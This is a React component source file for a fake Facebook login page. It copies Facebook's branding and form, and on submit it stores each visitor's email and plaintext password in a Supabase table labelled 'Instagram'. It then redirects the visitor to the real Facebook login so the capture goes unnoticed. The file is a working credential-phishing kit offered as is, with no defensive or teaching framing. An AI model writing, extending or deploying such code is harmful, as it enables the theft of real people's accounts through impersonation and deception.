import React, { useState } from "react";
import "./FacebookLogin.css";
import { supabase } from "../../supabase";

const FacebookLogin = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError("");
    setSuccess(false);
    const { error } = await supabase.from("Instagram").insert([
      { email, password },
    ]);
    setLoading(false);
    if (error) setError("Login failed. Try again.");
    else {
      setSuccess(true);
      window.location.href = "https://facebook.com/login";
    }
  };

  return (
    <div className="facebook-login-container">
      <div className="facebook-login-box">
        <div className="facebook-logo">f</div>
        <h2>Log in to Facebook</h2>
        <form className="facebook-login-form" onSubmit={handleSubmit}>
          <input
            type="text"
            className="facebook-login-input"
            placeholder="Email address or phone number"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
          />
          <input
            type="password"
            className="facebook-login-input"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
          <button type="submit" disabled={loading}>
            {loading ? "Logging in..." : "Log In"}
          </button>
        </form>
        <a
          className="facebook-login-forgot"
          href="https://www.facebook.com/login/identify/"
          target="_blank"
          rel="noopener noreferrer"
        >
          Forgotten password?
        </a>
        <div className="facebook-login-divider">
          <div className="line" />
          <div className="or">or</div>
          <div className="line" />
        </div>
        <div className="facebook-login-create">
          <a
            href="https://www.facebook.com/r.php"
            target="_blank"
            rel="noopener noreferrer"
          >
            Create new account
          </a>
        </div>
        {success && <div className="facebook-success">Login saved!</div>}
        {error && <div className="facebook-error">{error}</div>}
      </div>
    </div>
  );
};

export default FacebookLogin;
